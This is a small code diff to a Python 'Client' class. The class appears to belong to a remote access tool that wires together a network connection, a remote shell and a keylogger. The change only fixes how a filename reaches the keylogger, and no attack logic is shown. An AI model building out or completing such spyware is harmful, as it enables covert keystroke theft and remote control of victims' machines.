@@ -24,6 +24,7 @@ class Client:
         """
         self.host = host
         self.port = port
+        self.filename = filename
         
         # Create client instance
         self.client = Connection(self.host, self.port)
@@ -35,7 +36,7 @@ class Client:
         self.shell = Shell(self.sock)
         
         # Create keylogger instance
-        self.keylogger = Keylogger(self.filename)
+        self.keylogger = Keylogger(filename)
         
         
 
